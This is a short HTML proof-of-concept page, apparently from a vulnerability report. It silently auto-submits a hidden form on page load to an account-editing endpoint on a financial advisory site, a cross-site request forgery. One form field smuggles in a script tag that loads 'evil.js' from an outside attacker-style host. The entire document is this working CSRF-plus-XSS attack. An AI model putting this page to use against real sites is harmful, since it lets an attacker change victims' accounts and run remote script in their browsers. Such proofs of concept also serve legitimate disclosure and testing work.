<html>
<head>
<style>
.xss {display: none;
}
</style>
</head>

<body onload="XSS.submit();">

<form id="xss" action="https://www.hedgeable.com/advisor/account/editaccountcontroller.php" method="post" name="XSS">
<input name="loginTypeSubmit" value ="Disconnect your email account"></input>
<input name="gsScrollPos" value="<SCRIPT SRC='http://bradycoye.com.com/evil.js'></SCRIPT>"></input>

</form>
</body>

</html>
